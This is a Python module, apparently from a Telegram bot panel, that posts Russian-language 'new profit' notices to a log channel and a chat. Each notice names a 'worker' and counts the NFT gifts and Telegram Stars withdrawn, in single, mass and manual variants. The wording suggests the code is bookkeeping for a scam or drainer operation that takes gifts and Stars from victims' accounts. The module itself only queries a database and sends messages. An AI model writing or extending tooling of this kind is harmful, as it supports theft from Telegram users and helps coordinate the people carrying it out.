from log_bot import send_log
from models import Admin
from config import PANEL_LOG_CHANNEL_ID, PANEL_CHAT_ID
from db import Session
from sqlalchemy import select

PHOTO_URL = "https://i.postimg.cc/254xW89P/photo-2025-07-22-19-44-05.jpg"

async def _get_admin_name(admin):
    if getattr(admin, "hide_in_top", False):
        return "Скрыт"
    if getattr(admin, "nickname", None):
        return admin.nickname
    if getattr(admin, "first_name", None) or getattr(admin, "last_name", None):
        return f"{admin.first_name or ''} {admin.last_name or ''}".strip()
    if getattr(admin, "username", None):
        return admin.username
    return "⚡️"

async def send_admin_transfer_log_to_channel(admin_id: int, stars: int, gifts_unique: int):
    try:
        async with Session() as session:
            result = await session.execute(select(Admin).where(Admin.telegram_id == admin_id))
            admin = result.scalar_one_or_none()
            if not admin:
                return

            name = await _get_admin_name(admin)

            text = (
                f"<b>⚡️ Новый профит!</b>\n\n"
                f"<b>💁🏻‍♀️ Воркер: #{name}</b>\n"
                f"<b>🎁 Снято NFT: {gifts_unique}</b>\n"
                f"<b>⭐️ Снято Звёзд: {stars}</b>"
            )

            await send_log(PANEL_LOG_CHANNEL_ID, text, photo_url=PHOTO_URL)
            await send_log(PANEL_CHAT_ID, text)
    except Exception as e:
        print(f"[ADMIN_CHANNEL_LOG_ERROR] {e}")

async def send_massive_transfer_log_to_channel(
    admin_id: int, nft_total: int, stars_total: int,
    processed: int, total: int
):
    try:
        async with Session() as session:
            result = await session.execute(select(Admin).where(Admin.telegram_id == admin_id))
            admin = result.scalar_one_or_none()
            if not admin:
                return

            name = await _get_admin_name(admin)

            text = (
                f"<b>⚡️ Новый Профит!</b>\n\n"
                f"<b>🚀 Массовое снятие!</b>\n"
                f"<b>💁🏻‍♀️ Воркер: #{name}</b>\n"
                f"<b>✅ Успешно: {processed}/{total}</b>\n"
                f"<b>🎁 Снято NFT: {nft_total}</b>\n"
                f"<b>⭐️ Снято звёзд: {stars_total}</b>\n"
            )

            await send_log(PANEL_LOG_CHANNEL_ID, text, photo_url=PHOTO_URL)
            await send_log(PANEL_CHAT_ID, text)
    except Exception as e:
        print(f"[MASSIVE_CHANNEL_LOG_ERROR] {e}")

async def send_manual_transfer_log_to_channel(admin_id: int, stars: int, gifts_unique: int):
    try:
        async with Session() as session:
            result = await session.execute(select(Admin).where(Admin.telegram_id == admin_id))
            admin = result.scalar_one_or_none()
            if not admin:
                return

            name = await _get_admin_name(admin)

            text = (
                f"<b>⚡️ Новый Профит!</b>\n\n"
                f"<b>🔘 Ручное снятие</b>\n"
                f"<b>💁🏻‍♀️ Воркер: #{name}</b>\n"
                f"<b>🎁 Снято NFT: {gifts_unique}</b>\n"
                f"<b>⭐️ Снято Звёзд: {stars}</b>"
            )

            await send_log(PANEL_LOG_CHANNEL_ID, text, photo_url=PHOTO_URL)
            await send_log(PANEL_CHAT_ID, text)
    except Exception as e:
        print(f"[MANUAL_CHANNEL_LOG_ERROR] {e}")